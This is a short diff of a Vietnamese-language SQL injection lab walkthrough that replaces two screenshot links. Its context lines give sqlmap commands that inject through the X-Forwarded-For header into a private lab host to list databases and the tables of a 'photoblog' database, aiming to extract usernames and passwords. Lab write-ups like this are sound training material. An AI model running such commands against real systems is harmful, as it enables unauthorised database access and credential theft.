@@ -26,10 +26,9 @@
      
  - B4: Chúng ta sẽ sử dụng công cụ sqlmap để tìm `username` và `password` với câu lệnh `sqlmap -u http://192.168.199.130/ --headers = ”X-Forwarded-For: 1*” --dbs`
  
-     ![image](https://user-images.githubusercontent.com/101852647/162016532-d600fa0e-c2e1-40ab-8863-079462f33ef9.png)
+     ![image](https://user-images.githubusercontent.com/101852647/162203975-a9ec2a39-5da0-4c29-b579-55fe7854363a.png)
      
-     ![image](https://user-images.githubusercontent.com/101852647/162017326-e6b70db2-be7b-4805-a066-49f0675e050f.png)
-
+     ![image](https://user-images.githubusercontent.com/101852647/162204326-759f56f4-357b-43e0-8c43-a15eb7cfa9b9.png)
 
  - B5: Bây giờ chúng ta sẽ tìm tất cả các bảng có trong database bằng câu lệnh `sqlmap -u "http://192.168.199.130/" --headers="X-forwarded-for:1*" --tables -D photoblog --smart --batch`
  
